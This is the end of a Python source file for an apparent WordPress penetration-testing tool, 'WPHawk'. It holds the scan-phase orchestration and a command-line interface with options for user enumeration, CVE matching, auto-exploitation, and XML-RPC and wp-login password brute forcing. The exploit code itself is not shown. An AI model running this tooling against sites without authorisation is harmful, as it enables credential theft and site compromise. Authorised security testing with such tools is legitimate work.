            passive_enum_plugins(html, result)
            ok(f"Passive plugins: {len(result.plugins)} found")
        if do_t:
            passive_enum_themes(html, result)
            ok(f"Passive themes: {len(result.themes)} found")

        if args.aggressive:
            # Resolve wordlists: explicit flag > fallback --wordlist > auto-load from wordlists/
            _wl_general = args.wordlist
            plugin_wl = _load_wl_auto(args.wordlist_plugins or _wl_general,
                                       os.path.join(WORDLISTS_DIR, "plugins.txt"))
            theme_wl  = _load_wl_auto(args.wordlist_themes  or _wl_general,
                                       os.path.join(WORDLISTS_DIR, "themes.txt"))
            if plugin_wl:
                info(f"Plugin wordlist: {len(plugin_wl)} slugs")
            if theme_wl:
                info(f"Theme wordlist:  {len(theme_wl)} slugs")
            if do_p:
                await aggressive_enum_plugins(session, result, plugin_wl, args.delay, args.concurrency)
                ok(f"After aggressive: {len(result.plugins)} plugins total")
            if do_t:
                await aggressive_enum_themes(session, result, theme_wl, args.delay, args.concurrency)
                ok(f"After aggressive: {len(result.themes)} themes total")

        parallel = [
            check_sensitive_files(session, result),
            check_xmlrpc(session, result),
            check_security_headers(session, result),
            check_open_registration(session, result),
            check_directory_listing(session, result),
            check_wp_cron(session, result),
        ]
        if do_u:
            parallel.append(enumerate_users(session, result, args.max_users))
        await asyncio.gather(*parallel, return_exceptions=True)
        ok(f"Users: {len(result.users)} | Sensitive files (200): {sum(1 for f in result.sensitive_files if f['status']==200)}")
        if result.xmlrpc_accessible:
            warn(f"xmlrpc.php accessible — multicall: {'yes' if result.xmlrpc_multicall else 'no'}")

        # ── Phase 2.3: Extended User Enumeration ─────────────────────────────
        if do_u and result.users:
            section("PHASE 2.3 — EXTENDED USER ENUM")
            await enumerate_users_login_error(session, result)
            ok(f"Total users after extended enum: {len(result.users)}")

        # ── Phase 2.4: Backup / TimThumb / HTTP Methods / Debug Log ──────────
        section("PHASE 2.4 — BACKUP · TIMTHUMB · HTTP METHODS · DEBUG LOG")
        phase24_tasks = [parse_debug_log(session, result)]
        if args.scan_backups:
            phase24_tasks.append(scan_backup_files(session, result))
        if args.timthumb:
            phase24_tasks.append(scan_timthumb(session, result))
        if args.check_methods:
            phase24_tasks.append(check_http_methods(session, result))
        await asyncio.gather(*phase24_tasks, return_exceptions=True)

        if result.debug_log_findings:
            warn(f"debug.log: {len(result.debug_log_findings)} finding(s)")
        if result.backup_files:
            warn(f"Backup files exposed: {len(result.backup_files)}")
        if result.timthumb_findings:
            vuln_tt = [t for t in result.timthumb_findings if t.get("vulnerable")]
            warn(f"TimThumb: {len(result.timthumb_findings)} found, {len(vuln_tt)} vulnerable")
        if result.http_method_findings:
            warn(f"Dangerous HTTP methods: {len(result.http_method_findings)} endpoint(s)")

        # ── Phase 2.6: Upload Crawler · Dropin · MU-plugins · GraphQL ──────────
        section("PHASE 2.6 — UPLOAD CRAWLER · DROPIN · MU-PLUGINS · GRAPHQL")
        phase26_tasks = [
            detect_dropin_files(session, result),
            scan_mu_plugins(session, result),
            detect_graphql(session, result),
            check_exposed_plugins_api(session, result),
        ]
        if args.crawl_uploads:
            phase26_tasks.append(crawl_upload_directory(session, result))
        await asyncio.gather(*phase26_tasks, return_exceptions=True)
        if result.upload_findings:
            sensitive_up = [f for f in result.upload_findings
                            if f["type"] in ("sensitive_upload_file","listed_sensitive_file")]
            warn(f"Upload crawler: {len(sensitive_up)} sensitive file(s) found")
        if any(f["status"] == 200 for f in result.dropin_findings):
            warn("Drop-in files ACCESSIBLE — possible backdoor!")
        if result.graphql_endpoint:
            warn(f"GraphQL introspection open: {result.graphql_endpoint}")

        # ── Phase 2.5: Deep Recon ────────────────────────────────────────────
        if args.deep_recon:
            section("PHASE 2.5 — DEEP RECON")
            await asyncio.gather(
                analyze_js_files(session, result, html),
                parse_robots_sitemap(session, result),
                discover_rest_endpoints(session, result),
                enumerate_subdomains(session, result),
                return_exceptions=True
            )

        # ── Phase 3: CVE Intelligence ────────────────────────────────────────
        if args.cve and db:
            section("PHASE 3 — CVE INTELLIGENCE + VERSION MATCHING")
            # First: check WP.org for latest versions
            await check_plugin_versions(session, result)
            # Then: fetch + version-filter CVEs
            await enrich_with_cves(session, result, db, args.refresh_cache)
            total_vuln = sum(len(p.vulnerable_cves) for p in result.plugins + result.themes)
            crits = [
                (p.slug, cve) for p in result.plugins + result.themes
                for cve in p.vulnerable_cves if cve.cvss_score >= 9.0
            ]
            if crits:
                warn(f"CRITICAL vulns ({len(crits)}):")
                for slug, cve in crits:
                    warn(f"  {slug} — {cve.cve_id} CVSS {cve.cvss_score} {cve.description[:60]}")

        # ── Phase 3.5: Local CVE Template Engine ─────────────────────────────
        if args.local_cve:
            section("PHASE 3.5 — CVE TEMPLATE ENGINE")
            tdir = args.templates_dir
            await run_all_local_templates(session, result, tdir)

        # ── Phase 4: Exploitation ────────────────────────────────────────────
        if args.exploit:
            section("PHASE 4 — EXPLOITATION")
            await run_all_exploits(session, result, args, html)

    # ── Phase 5: Report ──────────────────────────────────────────────────────
    section("PHASE 5 — REPORT")
    generate_report(result, args.output, args.json, args.html)

    # ── Scan stats ───────────────────────────────────────────────────────────
    print(f"\n  {Di}Scan stats: {limiter.stats()}{RS}\n")

    if db:
        await db.close()

# ─────────────────────────────────────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        prog="wphawk",
        description="WPHawk v3.0 — Advanced WordPress Pentest Framework"
    )
    parser.add_argument("-u","--url", required=True, help="Target WordPress URL")
    parser.add_argument("--enumerate", default="all",
        choices=["plugins","themes","users","all"], help="What to enumerate (default: all)")
    parser.add_argument("--aggressive", action="store_true",
        help="Enable HTTP probe enumeration")
    parser.add_argument("--wordlist", default=None,
        help="External slug wordlist for both plugins and themes (fallback)")
    parser.add_argument("--wordlist-plugins", default=None, dest="wordlist_plugins",
        help=f"Plugin slug wordlist (auto: wordlists/plugins.txt)")
    parser.add_argument("--wordlist-themes", default=None, dest="wordlist_themes",
        help=f"Theme slug wordlist (auto: wordlists/themes.txt)")
    parser.add_argument("--max-users", type=int, default=20, dest="max_users",
        help="Max author IDs to probe (default: 20)")
    parser.add_argument("--delay", type=float, default=0.1,
        help="Delay between aggressive probes in seconds (default: 0.1)")
    parser.add_argument("--concurrency", type=int, default=10,
        help="Max parallel requests (default: 10)")
    parser.add_argument("--rps", type=float, default=10.0, dest="rps",
        help="Max requests per second across all scan phases (default: 10.0). "
             "Use 0 for unlimited — only on targets you own.")
    parser.add_argument("--deep-recon", action="store_true", dest="deep_recon",
        help="Enable deep recon: JS analysis, REST discovery, robots.txt, subdomains via crt.sh")
    parser.add_argument("--cve", action="store_true",
        help="Enable CVE lookup + version-aware matching (NVD + GitHub + Patchstack + Exploit-DB)")
    parser.add_argument("--refresh-cache", action="store_true", dest="refresh_cache",
        help="Ignore local CVE cache and re-fetch")
    parser.add_argument("--exploit", action="store_true",
        help="Enable auto-exploitation (CVE exploits, SSRF, XSS, Host Header)")
    parser.add_argument("--auth-scan", action="store_true", dest="auth_scan",
        help="Authenticated wp-admin scan after credential discovery")
    parser.add_argument("--brute", action="store_true",
        help="XML-RPC multicall credential brute force")
    parser.add_argument("--brute-login", action="store_true", dest="brute_login",
        help="wp-login.php brute force (serial, slow)")
    parser.add_argument("--passwords", default=None,
        help="Password wordlist (default: built-in 100 passwords)")
    parser.add_argument("--output", default=None,
        help="Custom report output path")
    parser.add_argument("--json", action="store_true",
        help="Also save JSON report to output/")
    parser.add_argument("--html", action="store_true",
        help="Also save self-contained HTML report to output/")
    parser.add_argument("--timeout", type=int, default=30,
        help="HTTP timeout in seconds (default: 30)")
    parser.add_argument("--no-verify-ssl", action="store_true", dest="no_verify_ssl",
        help="Disable SSL verification")
    # v3.0 additions
    parser.add_argument("--proxy", default=None,
        help="HTTP proxy URL (e.g. http://127.0.0.1:8080 for Burp)")
    parser.add_argument("--cookie", default=None,
        help="Session cookie string for authenticated requests "
             "(e.g. 'wordpress_logged_in_xxx=yyy; wp-settings-1=...')")
    parser.add_argument("--ua","--user-agent", default=None, dest="custom_ua",
        help="Override User-Agent string")
    parser.add_argument("-v","--verbose", action="store_true",
        help="Verbose output (show all probes, not just hits)")
    parser.add_argument("--scan-backups", action="store_true", dest="scan_backups",
        help="Scan for exposed backup archives (zip/tar.gz/sql) with domain+date patterns")
    parser.add_argument("--check-methods", action="store_true", dest="check_methods",
        help="Probe HTTP methods (OPTIONS/TRACE) on key endpoints")
    parser.add_argument("--timthumb", action="store_true",
        help="Scan for vulnerable TimThumb scripts (CVE-2011-4106)")
    parser.add_argument("--crawl-uploads", action="store_true", dest="crawl_uploads",
        help="Crawl wp-content/uploads/ for exposed sensitive files and open directory listings")
    # ── CVE template engine
    parser.add_argument("--local-cve", action="store_true", dest="local_cve",
        help="Run local nuclei-style CVE templates from ./cve/ against detected components")
    parser.add_argument("--templates-dir", default=TEMPLATES_DIR, dest="templates_dir",
        help=f"Directory with .json/.yaml CVE templates (default: {TEMPLATES_DIR})")
    parser.add_argument("--seed-templates", action="store_true", dest="seed_templates",
        help="Write all built-in CVE templates to --templates-dir and exit")
    parser.add_argument("--full-scan", action="store_true", dest="full_scan",
        help="Enable EVERY scan module in one flag: aggressive enumeration, deep recon, "
             "CVE intel, local CVE templates, upload crawler, backup scanner, TimThumb, "
             "HTTP method check, auto-exploitation, XML-RPC brute + wp-login brute, "
             "extended user enum (lostpassword). Sets --max-users 50.")

    args = parser.parse_args()

    # ── --full-scan expands into all individual module flags ─────────────────
    if args.full_scan:
        args.aggressive    = True
        args.deep_recon    = True
        args.cve           = True
        args.local_cve     = True
        args.crawl_uploads = True
        args.scan_backups  = True
        args.timthumb      = True
        args.check_methods = True
        args.exploit       = True
        args.brute         = True
        args.brute_login   = True
        if args.max_users < 50:
            args.max_users = 50

    # Quick action: seed templates to disk and exit
    if args.seed_templates:
        tdir = seed_template_dir(args.templates_dir)
        print(f"{g('[+]')} {len(BUILTIN_TEMPLATES)} templates written to: {tdir}")
        sys.exit(0)
    try:
        asyncio.run(main(args))
    except KeyboardInterrupt:
        print(f"\n{y('[!] Scan interrupted')}")
        sys.exit(0)
